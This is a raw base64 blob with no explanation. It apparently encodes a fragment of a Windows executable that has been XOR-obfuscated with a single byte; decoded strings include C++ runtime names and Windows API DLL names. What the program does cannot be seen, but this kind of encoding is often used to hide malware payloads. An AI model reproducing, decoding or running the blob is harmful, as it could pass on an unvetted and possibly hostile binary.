Fgeb5BYHt+QWB9fkFgf35BYHF+MWBzfjFgdX4xYHc+MWB5fjFgez4xYH0+MWB/vjFgcf4hYHD+IWBwviFgcz4hYHI+IWB0/iFgd34hYHe+IWB2viFgeP4hYHr+IWB/fiFgcf4RYHJ+EWB0vhFgdv4RYHi+EWB9fhFgf74RYHD+AWByPgFgdT4BYHpPkWB0/gFgd74BYHn+AWB4vgFger4BYHSEh1dmRycz8XFxcXSEh0c3J0exdISGd2ZHR2excXFxdISGRjc3R2e3sXFxdISGN/fmR0dnt7FxdISHF2ZGN0dnt7FxdISGFydGN4ZXR2e3sXFxcXSEh0e2V0dnt7FxcXSEhydnV+FxdISGdjZSEjF0hIZXJkY2V+dGMXF0hIYnl2e35weXJzF2VyZGNlfnRjPxcXFzd5cmAXFxcXN3Nye3JjchcqFxcXKSkXFysrFxc2FxcXKioXFzYqFxdMShcXeGdyZXZjeGUXFxcXOikXFz0XFxc8PBcXOjoXFzoXFxc8FxcXMRcXFzopPRc4FxcXMhcXFysXFxcrKhcXKRcXFykqFxc7FxcXPz4XF2kXFxdJFxcXaxcXFzExFxdraxcXPSoXFzwqFxc6KhcXOCoXFzIqFxcpKSoXKysqFzEqFxdrKhcXSSoXF3dhcWN2dXtyMBcXF3dhdWN2dXtyMBcXF3dhdHZ7ezAXd2NuZ3J4cTAXFxcXd3t4dHZ7N2RjdmN+dDdwYnZlczAXFxcXd2RjZX55cDAXFxcXd2F1dmRyN3NyZGNlYnRjeGUwFxd3YXJ0Y3hlN3Nye3JjfnlwN3NyZGNlYnRjeGUwFxcXF3dzcnF2YntjN3R4eWRjZWJ0Y3hlN3R7eGRiZXIwFxcXd2R0dnt2ZTdzcntyY355cDdzcmRjZWJ0Y3hlMBcXFxd3YXJ0Y3hlN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXF3dhcnRjeGU3c3JkY2VidGN4ZTd+Y3JldmN4ZTAXFxcXd2FydGN4ZTdhdXZkcjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXd2F+ZWNidns3c35kZ3t2dHJ6cnljN3p2ZzAXF3dyfzdhcnRjeGU3dHh5ZGNlYnRjeGU3fmNyZXZjeGUwFxcXF3dyfzdhcnRjeGU3c3JkY2VidGN4ZTd+Y3JldmN4ZTAXd3J/N2FydGN4ZTdhdXZkcjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXF3d0eGduN3R4eWRjZWJ0Y3hlN3R7eGRiZXIwFxd3YnNjN2VyY2JleX55cDAXd1JfF3dFQ0NeFxcXd3t4dHZ7N2FxY3Z1e3IwF3d7eHR2ezdhcWN2dXtyN3R4eWRjZWJ0Y3hlN3R7eGRiZXIwFzd5cmBMShcXN3Nye3JjckxKFxcXd3h6eX43dHZ7e2R+cDAXF3dne3Z0cnpyeWM3c3J7cmNyN3R7eGRiZXIwFxd3Z3t2dHJ6cnljN3Nye3JjckxKN3R7eGRiZXIwFxcXF3d6dnl2cHJzN2FydGN4ZTd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXFxd3enZ5dnByczdhcnRjeGU3c3JkY2VidGN4ZTd+Y3JldmN4ZTAXFxcXd3J/N2FydGN4ZTd0eGduN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXF3dyfzdhcnRjeGU3YXV2ZHI3dHhnbjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXd3NueXZ6fnQ3fnl+Y352e35tcmU3cXhlNzAXF3dzbnl2en50N3Zjcm9+YzdzcmRjZWJ0Y3hlN3F4ZTcwFxcXF3dhcnRjeGU3dHhnbjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXF3dhcnRjeGU3YXV2ZHI3dHhnbjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXFxcXd3p2eXZwcnM3YXJ0Y3hlN3R4Z243dHh5ZGNlYnRjeGU3fmNyZXZjeGUwFxd3e3h0dns3ZGN2Y350N2N/ZXJ2czdwYnZlczAXeGdyZXZjeGU3NTU3FxcXF3hncmV2Y3hlN3R4SHZgdn5jFxcXN0NuZ3I3U3JkdGV+Z2N4ZTAXFxc3VXZkcjdUe3ZkZDdTcmR0ZX5nY3hlN3ZjNz8XN1V2ZHI3VHt2ZGQ3VmVldm4wFxc3VHt2ZGQ3X35yZXZldH9uN1NyZHRlfmdjeGUwFxcXFzdUeHpne3JjcjdYdX1ydGM3W3h0dmN4ZTAXFxcRFxcRFxYXFwcXFBEXERUHE1JSUhISEhISIicXRxcXFxc/Ny9HTxAfFyAnJ0BHEBcXNzcfEBcXFx93f3d3d3cXF29nb29vbx8QHxAXEBcfHx8XFx8QHxcQHxcQFz8XeRdiF3sXexc+FxcXFxc/eWJ7ez4XFxcXFxcSFxfXHBcXFxcXFxcKFxfXExcXFxcXFxeBFxfXExcXFxcXFxeaFxfXHxcXFxcXFxeZFxfXHxcXFxcXFxeYFxfXHxcXFxcXFxeHFxfXHxcXFxcXFxeGFxfXHxcXFxcXFxeFFxfXHxcXFxcXFxeEFxfXHxcXFxcXFxejFRfXHxcXFxcXFxeiFRfXHxcXFxcXFxcbFxcXFBcXFx4XFxd6F2QXdBd4F2UXchdyFzkXcxd7F3sXFxdUeGVSb35jR2V4dHJkZBcXFxcXFygWFgcXFxcXZhYWBxcXFxfAPhYHBD0WB3kWFgd5FhYHVjwWB448FgcVLRYHBC0WBxcXFxe5FhYHgAEWB9QBFgemMxYHEDIWB6AvFgd5FhYH5iIWBxcXFxcXFxcXeRYWBxcXFxfHFhYHFxcXF6AWFgd5FhYHcRYWB1sWFgd5FhYHFhcXFwEXFxcVFxcXFRcXFxQXFxcVFxcXExcXFw8XFxcSFxcXGhcXFxEXFxceFxcXEBcXFxsXFxcfFxcXGxcXFx4XFxcbFxcXHRcXFxAXFxccFxcXHxcXFxsXFxcBFxcXGhcXFwEXFxcYFxcXFRcXFwcXFxcaFxcXBhcXFwUXFxcFFxcXFRcXFzYXFxcaFxcXIhcXFxUXFxdWFxcXGhcXF1QXFxcVFxcXRxcXFwYXFxdFFxcXGhcXF0QXFxcaFxcXQBcXFwEXFxdOFxcXHBcXF3sXFxcaFxcXehcXFzcXFxdnFxcXCxcXF2UXFxceFxcXlxcXFx0XFxeWFxcXHRcXF5UXFxceFxcXlBcXFwEXFxeTFxcXGhcXF4YXFxc+FxcXiRcXFxoXFxe2FxcXFRcXF7MXFxccFxcXsBcXFxoXFxegFxcXBhcXF9kXFxcVFxcXwBcXFxwXFxcPEBcXGxcXF15ZURd+eXEXWVZZF3l2eRdZVlk/RFlWWT4XFxd5dnk/ZHl2eT4XFxdZVlk/XllTPhcXFxd5dnk/fnlzPhcXFxdyPCcnJxcXF0RieRdaeHkXQ2JyF0BycxdDf2IXUWV+F0R2YxdEYnlzdm4XF1p4eXN2bhcXQ2JyZHN2bhdAcnN5cmRzdm4XFxdDf2JlZHN2bhcXFxdRZX5zdm4XF0R2Y2Jlc3ZuFxcXF112eRdRcnUXWnZlF1ZnZRdadm4XXWJ5F11iexdWYnAXRHJnF1h0YxdZeGEXU3J0F112eWJ2ZW4XUXJ1ZWJ2ZW4XFxcXWnZldH8XFxdWZ2V+excXF11ieXIXFxcXXWJ7bhcXFxdWYnBiZGMXF0RyZ2NyenVyZRcXF1h0Y3h1cmUXWXhhcnp1cmUXFxcXU3J0cnp1cmUXFxcXVloXF0daFxdaWjhzczhubhcXFxdzc3NzOzdaWlpaN3NzOzdubm5uF19fLXp6LWRkFxcXF0QXYhd5FxcXWhd4F3kXFxdDF2IXchcXF0AXchdzFxcXQxd/F2IXFxdRF2UXfhcXF0QXdhdjFxcXRBdiF3kXcxd2F24XFxcXF1oXeBd5F3MXdhduFxcXFxdDF2IXchdkF3MXdhduFxcXQBdyF3MXeRdyF2QXcxd2F24XFxdDF38XYhdlF2QXcxd2F24XFxcXF1EXZRd+F3MXdhduFxcXFxdEF3YXYxdiF2UXcxd2F24XFxcXF10Xdhd5FxcXURdyF3UXFxdaF3YXZRcXF1YXZxdlFxcXWhd2F24XFxddF2IXeRcXF10XYhd7FxcXVhdiF3AXFxdEF3IXZxcXF1gXdBdjFxcXWRd4F2EXFxdTF3IXdBcXF10Xdhd5F2IXdhdlF24XFxdRF3IXdRdlF2IXdhdlF24XFxcXF1oXdhdlF3QXfxcXF1YXZxdlF34XexcXF10XYhd5F3IXFxcXF10XYhd7F24XFxcXF1YXYhdwF2IXZBdjFxcXFxdEF3IXZxdjF3IXehd1F3IXZRcXF1gXdBdjF3gXdRdyF2UXFxdZF3gXYRdyF3oXdRdyF2UXFxcXF1MXchd0F3IXehd1F3IXZRcXFxcXVhdaFxcXFxdHF1oXFxcXF1oXWhc4F3MXcxc4F24XbhcXFxcXcxdzF3MXcxc7FzcXWhdaF1oXWhc3F3MXcxc7FzcXbhduF24XbhcXF18XXxctF3oXehctF2QXZBcXFxcXchd5FzoXQhdEFxcXFxcXF1fsFgdT7BYHX+wWB1vsFgdH7BYHQ+wWB0/sFgdL7BYHc+wWB3vsFgdj7BYHl+wWB5vsFgeD7BYHt+wWB7PsFge/7BYHu+wWB6fsFgej7BYHr+wWB6vsFgfX7BYH0+wWB9/sFgfb7BYHx+wWB8/sFgfz7BYH++wWB6fsFgfj7BYH6+wWBxPrFgcb6xYHD+sWBzfrFgc76xYHL+sWByvrFgdX6xYHW+sWB3frFgcWFxcXFxcXF3vrFgdj6xYHa+sWB5PrFgeb6xYHg+sWB4vrFgez6xYHo+sWB9PrFgfD6xYH/+sWB+vrFgcb6hYHN+oWBz/qFgcn6hYHL+oWB1fqFgdf6hYHR+oWB0/qFgd36hYHf+oWB2fqFgdv6hYHl+oWB4fqFgez6hYHp+oWB1fqFger6hYH3+oWB8PqFgfz6hYH7+oWBx/pFgcL6RYHJ+kWBy/pFgdX6RYHQ+kWB2vpFgeH6RYHFxcXF08XFQdT+BYHjxcVB8cXFQcPFhUHbxYVB9MWFQeX+BYHFxUVB1cVFQdrFRUHrxUVBx8UFQd3FBUHvxQVB+8UFQer+BYHGxMVBw8TFQd3ExUHdhdnF34XOhd6F2QXOhdgF34XeRc6F3QXeBdlF3IXOhdzF3YXYxdyF2MXfhd6F3IXOhd7FyYXOhcmFzoXJhcXF3YXZxd+FzoXehdkFzoXYBd+F3kXOhd0F3gXZRdyFzoXcRd+F3sXchc6F3sXJhc6FyUXOhclFxcXdhdnF34XOhd6F2QXOhdgF34XeRc6F3QXeBdlF3IXOhd7F3gXdBd2F3sXfhdtF3YXYxd+F3gXeRc6F3sXJhc6FyUXOhcmFxcXdhdnF34XOhd6F2QXOhdgF34XeRc6F3QXeBdlF3IXOhd7F3gXdBd2F3sXfhdtF3YXYxd+F3gXeRc6F3gXdRdkF3gXexdyF2MXchc6F3sXJhc6FyUXOhcnFxcXFxcXFxcXdhdnF34XOhd6F2QXOhdgF34XeRc6F3QXeBdlF3IXOhdnF2UXeBd0F3IXZBdkF2MXfxdlF3IXdhdzF2QXOhd7FyYXOhcmFzoXJRcXF3YXZxd+FzoXehdkFzoXYBd+F3kXOhd0F3gXZRdyFzoXZBdjF2UXfhd5F3AXOhd7FyYXOhcmFzoXJxcXF3YXZxd+FzoXehdkFzoXYBd+F3kXOhd0F3gXZRdyFzoXZBduF2QXfhd5F3EXeBc6F3sXJhc6FyUXOhcmFxcXFxd2F2cXfhc6F3oXZBc6F2AXfhd5FzoXdBd4F2UXchc6F2AXfhd5F2UXYxc6F3sXJhc6FyYXOhcnFxcXFxd2F2cXfhc6F3oXZBc6F2AXfhd5FzoXdBd4F2UXchc6F28XZBdjF3YXYxdyFzoXexclFzoXJhc6FycXFxd2F2cXfhc6F3oXZBc6F2AXfhd5FzoXZRdjF3QXeBdlF3IXOhd5F2MXYhdkF3IXZRc6F2AXfhd5F3MXeBdgFzoXexcmFzoXJhc6FycXFxcXF3YXZxd+FzoXehdkFzoXYBd+F3kXOhdkF3IXdBdiF2UXfhdjF24XOhdkF24XZBdjF3IXehdxF2IXeRd0F2MXfhd4F3kXZBc6F3sXJhc6FyYXOhcnFxcXFxdyF28XYxc6F3oXZBc6F2AXfhd5FzoXeRdjF2IXZBdyF2UXOhdzF34Xdhd7F3gXcBd1F3gXbxc6F3sXJhc6FyYXOhcnFxcXFxdyF28XYxc6F3oXZBc6F2AXfhd5FzoXeRdjF2IXZBdyF2UXOhdgF34XeRdzF3gXYBdkF2MXdhdjF34XeBd5FzoXexcmFzoXJhc6FycXFxcXF3YXcxdhF3YXZxd+FyQXJRcXFxcXeRdjF3MXexd7FxcXdhdnF34XOhd6F2QXOhdgF34XeRc6F3YXZxdnF3oXeBdzF3IXexc6F2UXYhd5F2MXfhd6F3IXOhd7FyYXOhcmFzoXJRcXFxcXYhdkF3IXZRckFyUXFxcXFxYXFxcHFxcXFhcXFwcXFxcWFxcXBxcXFxYXFxcHFxcXHxcXF1ByY0RuZGNyekN+enJHZXJ0fmRyVmRRfntyQ356chcXEBcXFwcXFxcUFxcXBxcXF1tUWnZnRGNlfnlwUm8XFxcUFxcXBxcXF1t4dHZ7cll2enJDeFtUXlMXFxcXBRcXF1ZnZ0d4e350blByY0dleHRyZGRDcmV6fnl2Y354eVpyY394cxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFzcXNxc3FzcXNxc3FzcXNxc3Fz8XPxc/Fz8XPxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxdfFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHF5MXkxeTF5MXkxeTF5MXkxeTF5MXBxcHFwcXBxcHFwcXBxeWF5YXlheWF5YXlhcWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcWFxYXBxcHFwcXBxcHFwcXlReVF5UXlReVF5UXFRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXFRcVFwcXBxcHFwcXNxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXl5aVlJOSkZCfnp2cm5qZmIeGhYSDgoGAj46NjIuKiYi3trW0s7KxsL++vby7urm4p6alpKOioaCvrq2sq6qpqNfW1dTT0tHQ397d3Nva2djHxsXEw8LBwM/OzczLysnI9/b19PPy8fD//v38+/r5+Ofm5eTj4uHg7+7t7Ovq6egXFhUUExIREB8eHRwbGhkYBwYFBAMCAQAPDg0MCwoJCDc2NTQzMjEwPz49PDs6OTgnJiUkIyIhIC8uLSwrKikoV3Z1dHNycXB/fn18e3p5eGdmZWRjYmFgb25tTEtKSUh3dnV0c3JxcH9+fXx7enl4Z2ZlZGNiYWBvbm1sa2ppaJeWlZSTkpGQn56dnJuamZiHhoWEg4KBgI+OjYyLiomIt7a1tLOysbC/vr28u7q5uKempaSjoqGgr66trKuqqajX1tXU09LR0N/e3dzb2tnYx8bFxMPCwcDPzs3My8rJyPf29fTz8vHw//79/Pv6+fjn5uXk4+Lh4O/u7ezr6unol5aVlJOSkZCfnp2cm5qZmIeGhYSDgoGAj46NjIuKiYi3trW0s7KxsL++vby7urm4p6alpKOioaCvrq2sq6qpqNfW1dTT0tHQ397d3Nva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FxcXMhUHLDcXFxsyFQcWMxcXCzIVBx4zFxc/MhUHHTMXFyMyFQcsMxcXVzIVBxY/FxdHMhUHHj8XF0syFQcdPxcXfzIVBxY7FxdjMhUHHjsXF5cyFQcdOxcXmzIVBxYnFxePMhUHHicXF7MyFQcdJxcXpzIVBxYjFxerMhUHHiMXF98yFQcdIxcXwzIVBxYvFxf3MhUHHS8XF/syFQcWKxcX7zIVBx0rFxcTMRUHFlcXFwcxFQcdVxcXCzEVBx1TFxc/MRUHHV8XFyMxFQcdWxcXVzEVBx1HFxdbMRUHE2sXF08xFQcNaxcXfzEVB3YXZRcXFxcXdRdwFxcXFxd0F3YXFxcXF20Xfxc6F1QXXxdEFxcXFxd0F2QXFxcXF3MXdhcXFxcXcxdyFxcXFxdyF3sXFxcXF3IXeRcXFxcXchdkFxcXFxdxF34XFxcXF3EXZRcXFxcXfxdyFxcXFxd/F2IXFxcXF34XZBcXFxcXfhdjFxcXFxd9F3YXFxcXF3wXeBcXFxcXeRd7FxcXFxd5F3gXFxcXF2cXexcXFxcXZxdjFxcXFxdlF3gXFxcXF2UXYhcXFxcXfxdlFxcXFxdkF3wXFxcXF2QXZhcXFxcXZBdhFxcXFxdjF38XFxcXF2MXZRcXFxcXYhdlFxcXFxd+F3MXFxcXF3UXchcXFxcXZBd7FxcXFxdyF2MXFxcXF3sXYRcXFxcXexdjFxcXFxdxF3YXFxcXF2EXfhcXFxcXfxduFxcXFxd2F20XFxcXF3IXYhcXFxcXehd8FxcXFxd2F3EXFxcXF3wXdhcXFxcXcRd4FxcXFxd/F34XFxcXF3oXZBcXFxcXfBd8FxcXFxd8F24XFxcXF2QXYBcXFxcXYhdtFxcXFxdjF2MXFxcXF2cXdhcXFxcXcBdiFxcXFxdjF3YXFxcXF2MXchcXFxcXfBd5FxcXFxd6F2UXFxcXF2QXdhcXFxcXehd5FxcXFxdwF3sXFxcXF3wXeBd8FxcXZBduF2UXFxdzF34XYRcXFxcXFxd2F2UXOhdEF1YXFxd1F3AXOhdVF1AXFxd0F3